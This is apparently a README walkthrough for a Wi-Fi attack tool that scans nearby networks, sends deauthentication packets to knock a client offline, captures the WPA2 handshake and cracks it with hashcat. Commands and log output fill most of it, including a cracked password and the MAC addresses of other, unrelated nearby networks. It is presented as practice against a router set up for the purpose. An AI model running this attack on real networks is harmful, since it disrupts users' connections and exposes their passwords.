# Detailed Instructions for Using the "wifi-attack-automation-tool"

Before running the script `wifi-attack-automation-tool.py`, it is essential to have **root privileges**, as the applications used by the script require these permissions.

Once the necessary privileges have been obtained, proceed to execute the script using the following command:

```
# python3 wifi-attack-automation-tool.py
```

The script itself will verify whether the required **Python packages and system tools** are installed for proper operation.

```
# python3 wifi-attack-automation-tool.py
[2025-06-26 23:12:05.999] <inf> Verifying required Python packages:
[2025-06-26 23:12:05.999] <inf> print_helper_logger is installed
[2025-06-26 23:12:05.999] <inf> scapy is installed
[2025-06-26 23:12:05.999] <inf> deauth_lib is available
[2025-06-26 23:12:05.999] <inf> All required Python packages are ready
[2025-06-26 23:12:06.272] <inf> Verifying required tools:
[2025-06-26 23:12:06.272] <inf> iw found
[2025-06-26 23:12:06.272] <inf> ifconfig found
[2025-06-26 23:12:06.272] <inf> iwconfig found
[2025-06-26 23:12:06.272] <inf> airodump-ng found
[2025-06-26 23:12:06.272] <inf> hcxpcapngtool found
[2025-06-26 23:12:06.272] <inf> hashcat found
[2025-06-26 23:12:06.272] <inf> All tools are ready. System check passed
[2025-06-26 23:12:06.279] <inf> Interfaces that support monitor mode:
[2025-06-26 23:12:06.279] <inf> 1)   wlx00e0202d05b8
```

Next, a list of available **network interfaces capable of monitor mode** will be displayed. You must select the desired one; in our case, it is the interface named `wlx00e0202d05b8`, so we choose **option number 1**.

At this point, the script will:
- Configure the selected interface in **monitor mode**.
- Prepare the environment to scan available wireless networks, including:
  - Access Points (AP)
  - Devices connected to them.

```
CH  9 ][ Elapsed: 1 min ][ 2025-06-26 23:26 

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

60:8D:26:FA:ED:11   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
E4:AB:89:9B:46:C2   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
88:DE:7C:A2:91:9F   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
CC:D4:A1:83:05:2F   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
4C:1B:86:AB:63:3D   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
EC:F4:51:7B:45:BB   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
28:9E:FC:3E:19:36   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
50:09:59:F2:BE:A9   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
2C:96:82:DD:4F:80  -58      234       20    0   6  648   WPA2 CCMP   PSK  MOVISTAR-WIFI6-4F80                                                                                                             
EC:BE:DD:AD:08:96  -57      256      160    0   9  195   WPA2 CCMP   PSK  HACK_ME                                                                                                                         
F4:1E:57:06:AA:F3  -70      128       40    0   1  360   WPA3 CCMP   SAE  OSCVER                                                                                                                          
34:60:F9:6A:95:62  -70      229        5    0   6  130   WPA2 CCMP   PSK  MOVISTAR-WIFI6-4F80_EXT                                                                                                         
D0:57:94:70:24:76   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
0C:01:4B:3E:E2:AE   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    
DC:51:93:D5:0A:F2   -1        0        0    0  -1   -1                    <length:  0>                                                                                                                    

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

2C:96:82:DD:4F:80  EC:0B:AE:6E:CE:B1  -61    0 - 1e     0        1                                                                                                                                         
2C:96:82:DD:4F:80  B8:50:D8:32:24:A8  -67    6e- 1e     0        3                                                                                                                                         
2C:96:82:DD:4F:80  F4:CE:46:52:FD:7E  -69    0 -36e     0       13                                                                                                                                         
2C:96:82:DD:4F:80  36:60:F9:0A:95:62  -71    6e- 1e     1       18                                                                                                                                         
EC:BE:DD:AD:08:96  F6:B1:11:45:98:25  -61    0 - 1e     0      182                                                                                                                                         
F4:1E:57:06:AA:F3  5A:A7:05:F0:B2:D0  -57    1e- 1e     2      175                                                                                                                                         
F4:1E:57:06:AA:F3  44:07:0B:A9:BD:11  -57    1e- 1e     0       32         OSCVER                                                                                                                          
F4:1E:57:06:AA:F3  F0:FE:6B:C0:F9:28  -61    1e- 1      9       11                                                                                                                                         
D0:57:94:70:24:76  CC:8C:BF:3C:38:05  -61    0 - 1     25      860                                                                                                                                         
(not associated)   D4:8D:26:2D:3C:3F  -75    0 - 1      0        1         Lowi753D                                                                                                                        
Quitting...
```

Once the **target network** has been identified (for example, the AP `HACK_ME` with BSSID `EC:BE:DD:AD:08:96`), we also select the **associated device** to which we will send **DeAuth packets**.

The objective is to **force its disconnection** in order to capture the **handshake** when it attempts to reconnect.

By stopping the scan with `Ctrl+C`, the script will analyze the devices connected to valid access points and display a list of them.


```
Quitting...
[2025-06-26 23:26:27.691] <wrn> (airodump-ng) Execution interrupted by user (CTRL+C)
[2025-06-26 23:26:27.691] <inf> 📋 Available targets with valid channels:
[2025-06-26 23:26:27.691] <inf> 1) 36:60:F9:0A:95:62 → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
[2025-06-26 23:26:27.691] <inf> 2) F4:CE:46:52:FD:7E → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
[2025-06-26 23:26:27.691] <inf> 3) B8:50:D8:32:24:A8 → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
[2025-06-26 23:26:27.691] <inf> 4) EC:0B:AE:6E:CE:B1 → BSSID: 2C:96:82:DD:4F:80 (Channel 6)
[2025-06-26 23:26:27.691] <inf> 5) F0:FE:6B:C0:F9:28 → BSSID: F4:1E:57:06:AA:F3 (Channel 1)
[2025-06-26 23:26:27.691] <inf> 6) F6:B1:11:45:98:25 → BSSID: EC:BE:DD:AD:08:96 (Channel 9)
[2025-06-26 23:26:27.691] <inf> 7) 44:07:0B:A9:BD:11 → BSSID: F4:1E:57:06:AA:F3 (Channel 1)
[2025-06-26 23:26:27.691] <inf> 8) 5A:A7:05:F0:B2:D0 → BSSID: F4:1E:57:06:AA:F3 (Channel 1)
```

We will then be prompted to **select the device to attack**, i.e., the one to which we will send the DeAuth packets. In this case, we select **option number 6**.

```
Enter the number of the client to target: 6
[2025-06-26 23:37:29.852] <inf> 🎯 Target selected: F6:B1:11:45:98:25 → AP: EC:BE:DD:AD:08:96 on channel 9
Enter number of DeAuth packets to send [default: 25]:
```

Next, we need to specify **how many DeAuth packets** we want to send:
- If no value is entered, the **default** is **25 packets**.
- By default, they will be sent **every 0.5 seconds**.

Once the number of packets is confirmed:
- A process will open using `airodump-ng` to **listen on the channel** corresponding to the selected AP (in this example, **channel 9**).
- Simultaneously, another process will start to **send the DeAuth packets**.

After the attack is completed, the **capture process will automatically close**.

```
Sent 25 packets.
[2025-06-26 23:39:22.142] <inf> Stopping handshake capture...

```

Subsequently, the tool `hcxpcapngtool` will be used to **convert the `.cap` file generated by `airodump-ng` into a hash format**.

```
[2025-06-26 23:39:22.156] <inf> Convert pcap to hash using hcxpcapngtool
[2025-06-26 23:39:22.166] <inf> (hcxpcapngtool) Conversion successful: /home/oscargomezf/GIT/wifi-attack-automation-tool/captures/wpa2.hc22000
[2025-06-26 23:39:22.166] <inf> /home/oscargomezf/GIT/wifi-attack-automation-tool/captures/wpa2.hc22000: WPA*01*70b128dd915b8008211276e7673bfcae*ecbeddad0896*f6b111459825*4841434b5f4d45***
WPA*02*f6c00ee66cd21f652adba752abe9149e*ecbeddad0896*f6b111459825*4841434b5f4d45*9005aa9a8b4f40769756c183aa1f2399d43bc46c0609731c017c1c1721b3a4d5*0103007502010a000000000000000000224d2532781f3de8856dc001f71a35312f3af13e32871a8dddb332179932600314000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*a2
```

With the hash file prepared, the tool `hashcat` will be used along with the password list `rockyou.txt` to **perform a brute-force attack** in an attempt to **crack the password**.

> ⏳ **Note:** The time required will depend on the size of the wordlist.

```
[2025-06-26 23:39:22.166] <inf> Trying to crack the hash using Hashcat (this task may take several minutes)...
[2025-06-26 23:41:57.437] <wrn> Password found: pipeylaura
[2025-06-26 23:41:57.437] <inf> Restoring interface to mode: managed
```

Finally, if the process is successful, the **recovered password will be displayed** (for example, `pipeylaura`).

As a **final step**, the script will **return the WiFi interface to its original state**.

---

## Additional Notes

- **Note 1:** It is recommended to run the script within a **Python virtual environment** to avoid dependency conflicts.

- **Note 2:** The router with SSID `HACK_ME` has been prepared **exclusively for this practice**.
  - **Security:** WPA + WPA2
  - **Key:** Randomly selected from the `rockyou.txt` wordlist.
